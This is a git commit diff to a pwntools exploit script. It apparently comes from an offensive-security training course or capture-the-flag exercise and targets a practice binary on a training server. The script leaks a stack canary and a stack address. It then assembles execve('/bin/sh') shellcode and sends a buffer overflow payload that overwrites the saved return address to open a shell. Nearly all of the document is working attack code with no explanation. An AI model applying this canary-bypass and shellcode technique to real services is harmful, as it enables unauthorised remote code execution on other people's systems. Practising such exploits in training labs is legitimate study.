a5c8bf0f936ae307219ddb005cc74bc1c20717c5
zerocool <bordeianu.stefano@gmail.com>
2023-10-06 15:53:07 +0200

    new challenges

--- mitigations/gonnaleak/x.py
+++ mitigations/gonnaleak/x.py
@@ -13,21 +13,11 @@ if "REMOTE" not in args:
 
     input("wait")
 else:
-    r = remote("bin.training.offdef.it", 2010)
+    r = remote("bin.training.offdef.it", 2011)
 
-asm_code = """
-mov rax, 0x3b
-xor rsi, rsi
-xor rdx, rdx
-mov rdi, 0x4040a0
-add rdi, 0x1a
-syscall
-"""
 
 context.arch = 'amd64'
-stringa = "/bin/sh"
-shellcode = asm(asm_code)
-res = shellcode + (b"/bin/sh")
+stringa = b"/bin/sh"
 
 print("1:", r.recv())
 r.send(b"B"*105)
@@ -37,33 +27,37 @@ leaked_canary = b"\x00" + r.read(7)
 canary = u64(leaked_canary)
 print("[!] leaked_canary %#x" % canary)
 
-r.send(b"A"*120)
+r.send(b"A"*152)
 r.recvuntil(b"> ")
-r.read(120)
+r.read(152)
 leaked_address =  r.read(6) + b"\x00\x00"
 addr = u64(leaked_address)
 swapped = addr.to_bytes(8, byteorder='big')
 print("leaked add %#x" %addr)
-
 print("converted leaked %#d" %addr)
-# addr = u64(swapped)
-# print("converted swapped %#d" %addr)
-# print("swapped add %#x" %addr)
 
-myAddr = 140737350114704  #leaked in locale
-mybuff = 140737488346738  #start of buffer in locale
-stackOffset = myAddr - mybuff
+myAddr = 140737488347032  #leaked in locale
+mybuff = 140737488346640  #start of buffer in locale
 
-# programOff = myAddr - addr
-# trueOff = stackOffset + programOff
-#print(trueOff)
+programOff = addr - myAddr
 
-whereToJump = addr-stackOffset
+whereToJump = mybuff + programOff + 1
 print("Where to jump %#x" %whereToJump)
 wtj = whereToJump.to_bytes(8, byteorder='little')
 
+shellcode = """
+mov rax, 0x3b
+xor rsi, rsi
+xor rdx, rdx
+mov rdi, """ + str(whereToJump) + """
+add rdi, 0x1d
+syscall
+"""
 
-payload = b"A"*104 + leaked_canary + b"B"*8 + wtj
+assembled = asm(shellcode)
+assembled = assembled + stringa + b"\x00"
+
+payload = b"A"+ assembled + b"A"* (103-len(assembled)) + leaked_canary + b"B"*8 + wtj
 
 r.send(payload)
 
@@ -71,7 +65,7 @@ r.send(payload)
 #0x00007fffffffde72 start of buffer in locale
 
 
-time.sleep(0.1)
+time.sleep(0.5)
 
 r.sendline(b"")
 
